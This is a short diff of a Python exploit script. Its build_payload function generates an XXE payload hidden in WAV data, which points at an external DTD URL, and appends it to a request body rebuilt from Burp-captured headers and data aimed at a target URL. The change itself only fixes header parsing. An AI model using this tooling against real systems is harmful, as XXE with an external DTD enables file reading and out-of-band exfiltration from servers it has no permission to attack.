@@ -124,12 +124,15 @@ def build_payload(session, target_url, dtd_url, dtd_filename, **kwargs) -> (str,
   wav_payload = gen_xxe_payload(dtd_url, dtd_filename)
 
   # test 1 = load BURP file, just replace the payload
-  headers_raw = open('request.headers', 'r')
+  headers_raw = open('request.headers', 'r').read()
   # load headers in session
   for h_line in headers_raw.split('\r\n'):
-    h, rest = h_line.split(': ')
-    if h.lower() in ['cookies', 'origin', 'content-type']:
-      headers[h] = rest
+    try:
+      h, rest = h_line.split(': ')
+      if h.lower() in ['cookies', 'origin', 'content-type']:
+        headers[h] = rest
+    except:
+      ...
   # load data in session
   data = open('request.data', 'rb').read()
   data = data + wav_payload.getvalue()
